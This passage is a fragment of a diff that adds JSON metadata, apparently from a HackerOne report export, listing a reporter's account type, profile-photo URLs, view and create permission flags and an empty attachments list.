+                "user_type": "hacker",
+                "profile_picture_urls": {
+                    "small": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+                    "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        }
+    ]
+}
